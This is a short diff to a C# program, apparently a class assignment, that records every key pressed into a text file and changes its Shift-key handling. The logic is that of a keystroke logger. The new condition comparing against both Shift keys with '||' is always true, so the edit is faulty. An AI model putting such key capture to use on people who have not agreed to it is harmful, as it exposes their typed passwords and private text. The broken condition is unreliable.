@@ -94,13 +94,13 @@ namespace Opdrag4C
                 {
                     using (StreamWriter writer = new StreamWriter(str))
                     {
-                        if (!(e.KeyPressed == Key.LeftCtrl || Keyboard.GetKeyStates(Key.LeftShift) == KeyStates.Down))
+                        if (!(e.KeyPressed == Key.LeftCtrl || Keyboard.GetKeyStates(Key.LeftShift) == KeyStates.Down || Keyboard.GetKeyStates(Key.RightShift) == KeyStates.Down))
                         {
                             writer.Write(e.KeyPressed.ToString().ToLower() + " ");
                         }
                         else if (Keyboard.GetKeyStates(Key.LeftShift) == KeyStates.Down && e.KeyPressed != Key.HanjaMode)
                         {
-                            if (e.KeyPressed != Key.LeftShift)
+                            if (e.KeyPressed != Key.RightShift || e.KeyPressed != Key.LeftShift)
                                 writer.Write(e.KeyPressed.ToString().ToUpper() +" ");//Will caps the key that you enter into the text file
                         }
                     }
